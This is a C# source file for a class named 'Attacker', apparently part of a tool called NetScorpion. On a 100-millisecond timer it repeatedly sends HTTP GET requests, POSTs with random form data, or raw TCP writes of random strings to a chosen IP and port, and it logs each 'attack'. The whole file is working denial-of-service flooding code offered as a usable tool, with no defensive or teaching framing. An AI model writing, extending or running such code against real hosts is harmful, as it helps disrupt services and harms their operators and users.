using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Timers;

namespace NetScorpion.Common
{
    public class Attacker
    {
        public string TargetIP { get; set; }
        public int TargetPORT { get; set; }

        public string TargetProtocol { get; set; }

        Timer attackTimer = new Timer(100);        
        public Attacker(string targetIp, int targetPort, string targetProtocol)
        {
            TargetIP = targetIp;
            TargetPORT = targetPort;
            TargetProtocol = targetProtocol;

            attackTimer.Elapsed += attackTimeElapsed;
        }

        public void Start()
        {
            attackTimer.Start();
        }

        public void Stop()
        {
            attackTimer.Stop();
        }

        public bool isRunning()
        {
            return attackTimer.Enabled;
        }

        private async void attackTimeElapsed(object sender, ElapsedEventArgs e)
        {
            if (TargetProtocol == "http")
            {
                await HttpAttackAsync();
            }
            if (TargetProtocol == "tcp")
            {
                await AttackAsync();
            }
        }

        private static readonly HttpClient client = new HttpClient();
        private async Task HttpAttackAsync()
        {
            //
            // HTTP/GET Request
            //

            try
            {
                string html = string.Empty;
                string url = TargetIP;

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AutomaticDecompression = DecompressionMethods.GZip;

                var reqresponse = await request.GetResponseAsync();

                var stream = reqresponse.GetResponseStream();

                using (StreamReader reader = new StreamReader(stream))
                {
                    html = reader.ReadToEnd();
                }

                Tools.writeLog($"HTTP GET Attacking to {TargetIP}...", LogType.Info);
            }
            catch { Tools.writeLog($"Attacking failed: {TargetIP}:{TargetPORT}. Host might be down.", LogType.Error); }

            //
            // HTTP/POST Request
            //

            try
            {
                var values = new Dictionary<string, string>();

                for (int i = 0; i <= 30; i++)
                {
                    try
                    {
                        string randVal = randomString(10);

                        if (!values.TryGetValue(randVal, out string val))
                        {
                            values.Add(randVal, randVal);
                        }
                    }
                    catch { }
                }

                var content = new FormUrlEncodedContent(values);

                await client.PostAsync(TargetIP, content);

                Tools.writeLog($"HTTP POST Attacking to {TargetIP}...", LogType.Info);
            }
            catch { Tools.writeLog($"Attacking failed: {TargetIP}:{TargetPORT}. Host might be down.", LogType.Error); }
        }

        private async Task AttackAsync()
        {
            try
            {
                string message = randomString(100);

                int port = TargetPORT;

                TcpClient client = new TcpClient(TargetIP, port);

                byte[] data = System.Text.Encoding.UTF8.GetBytes(message);

                NetworkStream stream = client.GetStream();

                await stream.WriteAsync(data, 0, data.Length);

                data = new byte[256];

                stream.Close();
                client.Close();

                Tools.writeLog($"TCP Attacking to {TargetIP}...", LogType.Info);
            }
            catch { Tools.writeLog($"TCP Attacking failed: {TargetIP}:{TargetPORT}. Host might be down.", LogType.Error); }
        }

        private Random random = new Random();
        private string randomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
